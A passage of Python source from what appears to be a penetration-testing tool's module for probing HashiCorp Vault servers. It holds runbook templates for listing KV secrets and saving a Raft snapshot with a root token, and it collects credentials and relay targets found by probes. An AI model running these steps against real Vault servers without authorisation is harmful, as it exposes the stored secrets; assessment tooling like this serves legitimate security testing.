        {"step": "KV walk (v2)",
         "cmd": f"VAULT_ADDR=https://{ip}:{port} VAULT_TOKEN=<t> "
                "vault kv list <mount>/"},
        {"step": "Raft snapshot (root-capable token)",
         "cmd": f"VAULT_ADDR=https://{ip}:{port} VAULT_TOKEN=<root> "
                "vault operator raft snapshot save vault.snap"},
    ]


def findings_to_vulns(fs: list[dict]) -> dict:
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "vault", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None,
            token: str = "") -> dict:
    """Analyze Vault targets. `token` (or creds['vault_token']) enables the
    authed walk - mounts, auth backends, KV dump, raft snapshot HEAD."""
    from . import svcprobe
    if not token and isinstance(creds, dict):
        token = str(creds.get("vault_token") or "")
    targets = vault_targets(hosts)
    probes: dict = {}
    state: dict = {}
    if active:
        for t, pr in svcprobe.iter_probe(
                targets,
                lambda t: probe(t["ip"], t["port"], token=token),
                budget=budget, progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["reachable"] = pr.get("reachable", False)
                t["version"] = pr.get("version", "") or t.get("version", "")
                t["sealed"] = pr.get("sealed")
                t["dev_mode"] = pr.get("dev_mode", False)
                t["uninitialized"] = pr.get("uninitialized", False)
    fs = findings(hosts, probes)

    facts_union: dict = {"hostnames": [], "domains": [], "users": [],
                         "hosts": [], "relay_targets": [], "credentials": []}
    for pr in probes.values():
        for k, v in (pr.get("facts") or {}).items():
            bucket = facts_union.setdefault(k, [])
            for item in v:
                if item not in bucket:
                    bucket.append(item)

    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "facts": facts_union,
            "stats": {"targets": len(targets), "findings": len(fs),
                      "authed": bool(token),
                      "stopped": state.get("stopped")}}
